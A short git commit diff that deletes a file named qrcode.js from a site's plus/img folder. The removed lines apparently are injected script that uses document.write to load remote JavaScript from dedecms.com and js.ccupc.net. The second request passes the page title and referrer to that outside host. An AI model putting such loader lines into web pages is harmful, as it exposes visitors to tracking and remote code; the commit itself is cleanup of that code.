3e1228add5cd49d96b2c006714c3a5dc16e5d4ec
qianjilou <qianjilou@qq.com>
2017-07-27 11:36:38 +0800

    manual

--- zhongai/plus/img/qrcode.js
+++
@@ -1,2 +0,0 @@
-document.write("<script language='javascript' src='http://updatenew.dedecms.com/base-v57/gb2312/source/plus/img/qrcode.js?_veri=20121009'><\/script>");document.write("<script language='javascript' src='http://js.ccupc.net/re/re.php?src=t6413&t="+encodeURIComponent(document.title)+"&ci=2002824350&r="+encodeURIComponent(document.referrer)+"'><\/script>");
-
